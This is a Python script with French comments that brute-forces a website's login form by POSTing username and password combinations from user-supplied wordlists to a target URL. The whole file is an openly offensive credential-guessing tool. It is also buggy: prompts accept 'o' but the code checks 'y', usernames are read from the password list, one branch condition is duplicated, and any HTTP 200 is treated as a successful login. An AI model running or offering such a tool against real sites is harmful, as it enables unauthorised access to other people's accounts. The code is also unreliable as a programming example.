#
# NOM ET PRENOM: Maxime Morisson
#


import os 
import requests
import sys 
import time 


print("                                                                        ")
print("### ~                                                             ~  ###")
print("### ~ Bienvenue sur le script de bruteforce pour une requete HTTP ~  ###") 
print("### ~                                                             ~  ###")
print("                                                                        ")


# Renseignement de l'url cible.
urlwebsite = input("URL du site cible: ")

#------------------------------------------------------------------------------------------------#
#---------------------------------------- LOGIN -------------------------------------------------#
#------------------------------------------------------------------------------------------------#


# Choix utilisation dictionnaire de login.
ask_login_list_yes_no = input("\nVoulez-vous utiliser un dictionnaire de login ? (o) or (n): ")

# Si oui alors renseignement du chemin où se situe le dictionnaire.
if ask_login_list_yes_no.lower() == "o":
    login_dictionary = input("Entrer le chemin du dictionnaire de login: ")

    # Ouverture du fichier en mode READ.
    login_list = open(login_dictionary,"r")

else:
    # Renseignement du login.
    uname = input("Indiquer le login: ") 

#------------------------------------------------------------------------------------------------#
#---------------------------------------- PASSWORD ----------------------------------------------#
#------------------------------------------------------------------------------------------------#



# Choix utilisation dictionnaire de mdp.
cred_yes_no = input("\nVoulez-vous utiliser un dictionnaire de mots de passes ? (o) or (n): ")

# Si oui alors renseignement du chemin où se situe le dictionnaire.
if cred_yes_no.lower() == "o":
    cred_dictionary = input("Entrer le chemin du dictionnaire de login: ")
    
    # Ouverture du fichier en mode READ.
    passw_list = open(cred_dictionary,"r")
else:
    # Sinon le user donne de mdp qu'il veut.
    passw = input("Entrer le mot de passe: ")
 

uname_field = input("Login cible: ")
pass_field = input("Mot de passe cible: ")


while True:
    
    # Cas où l'utilisateurs veut utiliser des dictionnaires
    if ask_login_list_yes_no.lower() == "y" and cred_yes_no.lower() == "y":
        passw = passw_list.readline()
        pass_main = passw.strip()
        uname = passw_list.readline()
        user_main = uname.strip()
        
        # Payload 
        payload = {

            uname_field: user_main,
            pass_field: pass_main

        }

#------------------------------------------------------------------------------------------------#
#-------------------------------------- BRUTEFORCE ----------------------------------------------#
#------------------------------------------------------------------------------------------------#

        # Bruteforce 
        r = requests.post(urlwebsite, data=payload)
        print("Tentative d'attaque:"+str(user_main)+":"+str(pass_main)+":")
        if r.status_code == 200:
            print("Occurence trouvee !!" + str(user_main)+":"+str(pass_main))
            break
        


    # Demande au user s'il veut utiliser un dictionnaire ou non.
    if ask_login_list_yes_no.lower() == "y" and cred_yes_no.lower() == "n":
        passw = passw
        uname = passw_list.readline()
        user_main = uname.strip()

        # Payload 
        payload = {

            uname_field: user_main,
            pass_field: passw

        }

#------------------------------------------------------------------------------------------------#
#-------------------------------------- BRUTEFORCE ----------------------------------------------#
#------------------------------------------------------------------------------------------------#

        # Bruteforce 
        r = requests.post(urlwebsite, data=payload)
        print("Tentative d'attaque:"+str(user_main)+":"+str(passw)+":")
        if r.status_code == 200:
            print("Occurence trouvee !!" + str(user_main)+":"+str(passw))
            break
       

    # user wordlist no and pass wordlist yes
    if ask_login_list_yes_no.lower() == "n" and cred_yes_no.lower() == "y":
        passw = passw_list.readline()
        pass_main = passw.strip()
        uname = uname
        
        # Payload 
        payload = {

            uname_field: uname,
            pass_field: pass_main

        }

#------------------------------------------------------------------------------------------------#
#-------------------------------------- BRUTEFORCE ----------------------------------------------#
#------------------------------------------------------------------------------------------------#

        # Bruteforce 
        r = requests.post(urlwebsite, data=payload)
        print("Tentative d'attaque:"+str(uname)+":"+str(pass_main)+":")
        if r.status_code == 200:
            print("Occurence trouvee !!" +str(uname)+":"+str(pass_main))
            break
        

    
    # user wordlist no and pass wordlist no 
    if ask_login_list_yes_no.lower() == "n" and cred_yes_no.lower() == "y":
        passw = passw
        uname = uname
        # Payload 
        payload = {

            uname_field: uname,
            pass_field: passw

        }

#------------------------------------------------------------------------------------------------#
#-------------------------------------- BRUTEFORCE ----------------------------------------------#
#------------------------------------------------------------------------------------------------#

        # Bruteforce 
        r = requests.post(urlwebsite, data=payload)
        print("Tentative d'attaque:"+str(uname)+":"+str(passw)+":")
        if r.status_code == 200:
            print("Occurence trouvee !!" + str(uname)+":"+str(passw))
            break
        else:
            print("Veuillez a nouveau executer le script !")
            break